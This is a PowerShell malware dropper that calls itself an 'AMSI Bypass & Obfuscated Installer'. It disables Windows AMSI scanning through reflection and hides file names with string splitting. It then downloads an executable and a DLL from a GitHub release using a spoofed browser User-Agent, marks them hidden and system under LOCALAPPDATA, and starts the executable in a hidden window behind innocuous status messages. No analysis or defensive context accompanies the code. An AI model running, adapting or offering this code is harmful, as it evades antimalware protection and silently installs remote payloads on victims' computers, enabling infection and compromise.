# -*- coding: utf-16 -*-
# Session-level AMSI Bypass & Obfuscated Installer
$w = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($w) {
    $w.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}

# Variable Obfuscation
$a1 = "$env:LOCALAPPDATA\Microsoft"
$a2 = "\Windows\Shell"
$a3 = "\VaultDataSync"
$b1 = "$a1$a2"
$b2 = "$a1$a3"

# File name obfuscation
$c1 = "Sy" + "nc" + "App.e" + "xe"
$c2 = "e_sq" + "lite3" + ".dll"

# Setup dirs
if (!(Test-Path $b1)) { New-Item -ItemType Directory -Path $b1 -Force | Out-Null }
if (!(Test-Path $b2)) { New-Item -ItemType Directory -Path $b2 -Force | Out-Null }

# Network Client (more stealthy than iwr)
$v = New-Object Net.WebClient
$v.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

# URLs (User must update these)
$d1 = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/releases/download/ADLKAHHahsdhhbCAHUJhlvHA/SyncHost.exe"
$d2 = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/e_sqlite3.dll"

$e1 = Join-Path $b1 $c1
$e2 = Join-Path $b1 $c2
$f1 = Join-Path $b2 $c1
$f2 = Join-Path $b2 $c2

Write-Host "Checking modules..."

try {
    $v.DownloadFile($d1, $e1)
    $v.DownloadFile($d2, $e2)
    
    # Move and Hide
    Move-Item -Path $e1 -Destination $f1 -Force
    Move-Item -Path $e2 -Destination $f2 -Force
    
    $g = "attrib " + "+h " + "+s "
    Invoke-Expression "$g `"$b2`""
    Invoke-Expression "$g `"$f1`""
    Invoke-Expression "$g `"$f2`""
    
    if (Test-Path $f1) {
        # Start hidden
        $s = New-Object System.Diagnostics.ProcessStartInfo
        $s.FileName = $f1
        $s.WindowStyle = "Hidden"
        $s.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($s) | Out-Null
    }
} catch {
    Write-Host "Init failed."
}
